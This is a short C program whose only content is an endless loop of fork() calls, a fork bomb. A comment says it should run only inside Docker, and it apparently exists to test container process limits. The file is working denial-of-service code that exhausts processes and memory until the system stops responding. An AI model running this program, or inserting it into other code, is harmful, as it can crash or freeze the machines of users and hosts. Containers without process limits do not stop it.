#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>

int main(int argc, char **argv) {
    // only run in docker, otherwise things will be sad
    while (true) { fork(); }
    return 0;
}

